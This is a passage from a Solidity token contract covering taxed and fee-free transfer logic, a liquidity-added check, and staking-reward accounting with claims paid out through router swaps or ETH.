        if ((sender != _pairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)
            _swapContractToken(swapThreshold,false);

        uint256 taxedAmount;

        if(tax > 0) {
        taxedAmount = amount * tax / 100;          
        }

        uint256 receiveAmount = amount - taxedAmount;
        _removeToken(sender,amount);
        _addToken(address(this), taxedAmount);
        _addToken(recipient, receiveAmount);
        emit Transfer(sender, recipient, receiveAmount);
    }
    
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");

        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));

        bool isContractTransfer = (sender == address(this) || recipient == address(this));
        address _routerAddress = address(_swapRouter);
        bool isLiquidityTransfer = (
            (sender == _pairAddress && recipient == _routerAddress) 
            || (recipient == _pairAddress && sender == _routerAddress)
        );

        bool isSell = recipient == _pairAddress || recipient == _routerAddress;
        bool isBuy=sender==_pairAddress|| sender == _routerAddress;

        if (isContractTransfer || isLiquidityTransfer || isExcluded) {
            _feelessTransfer(sender, recipient, amount);

            if (!liquidityAdded) 
                checkLiqAdd(recipient);            
        }
        else { 
            _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  
        }
    }

    function checkLiqAdd(address receiver) private {        
        require(!liquidityAdded, "liquidity already added");
        if (receiver == _pairAddress) {
            liquidityBlock = block.number;
            liquidityAdded = true;
        }
    }

    function claimToken(address addr, address token, uint256 payableAmount) private {
        require(!_isWithdrawing);
        _isWithdrawing = true;
        uint256 amount;
        bool swapSuccess;
        address tokenClaimed = token;

        if (_excludedFromStaking.contains(addr)){
            amount = toBePaidShares[addr];
            toBePaidShares[addr] = 0;
        }
        else {
            uint256 newAmount = newStakeOf(addr);            
            alreadyPaidShares[addr] = rewardShares * _balances[addr];
            amount = toBePaidShares[addr]+newAmount;
            toBePaidShares[addr] = 0;
        }
        
        if (amount == 0 && payableAmount == 0){
            _isWithdrawing = false;
            return;
        }

        totalPayouts += amount;
        accountTotalClaimed[addr] += amount;
        amount += payableAmount;

        address[] memory path = new address[](2);
        path[0] = _swapRouter.WETH();
        path[1] = token;

        try _swapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            addr,
            block.timestamp)
            {
            swapSuccess = true;
        }
        catch {
            swapSuccess = false;
        }
        
        if(!swapSuccess) {
            _sendEth(addr, amount);
            tokenClaimed = _swapRouter.WETH();
        }
        emit ClaimToken(amount, tokenClaimed, addr);
        _isWithdrawing = false;
    }

    function excludeFromStaking(address addr) private {
        require(!_excludedFromStaking.contains(addr));
        _totalShares -= _balances[addr];
        uint256 newStakeMain = newStakeOf(addr);      
        alreadyPaidShares[addr] = _balances[addr] * rewardShares;       
        toBePaidShares[addr] += newStakeMain;      
        _excludedFromStaking.add(addr);
    }

    function includeToStaking(address addr) private {
        require(_excludedFromStaking.contains(addr));
        _totalShares += _balances[addr];
        _excludedFromStaking.remove(addr);
        alreadyPaidShares[addr] = _balances[addr] * rewardShares;
    }

    function subtractStake(address addr, uint256 amount) private {
        if (amount == 0) return;
        require(amount<=getStakeBalance(addr),"Exceeds stake balance");

        if (_excludedFromStaking.contains(addr))
            toBePaidShares[addr] -= amount;

        else{
            uint256 newAmount  =newStakeOf(addr);    
            alreadyPaidShares[addr] = rewardShares * _balances[addr];
            toBePaidShares[addr] += newAmount;
            toBePaidShares[addr] -= amount;                
        }
    }   

    function getStakeBalance(address addr) private view returns (uint256) {
        if (_excludedFromStaking.contains(addr)) 
            return toBePaidShares[addr];
        return newStakeOf(addr) + toBePaidShares[addr];
    }
    
    function getTotalShares() private view returns (uint256) {
        return _totalShares - TOTAL_SUPPLY;
    }

     function setUnlockTime(uint256 newUnlockTime) private {
        // require new unlock time to be longer than old one
        require(newUnlockTime > _liquidityUnlockTime);
        _liquidityUnlockTime = newUnlockTime;
    }

    function newStakeOf(address staker) private view returns (uint256) {
            uint256 fullPayout = rewardShares * _balances[staker];
            if (fullPayout < alreadyPaidShares[staker]) 
                return 0;
            return (fullPayout-alreadyPaidShares[staker]) / DISTRIBUTION_MULTI;    
    }
}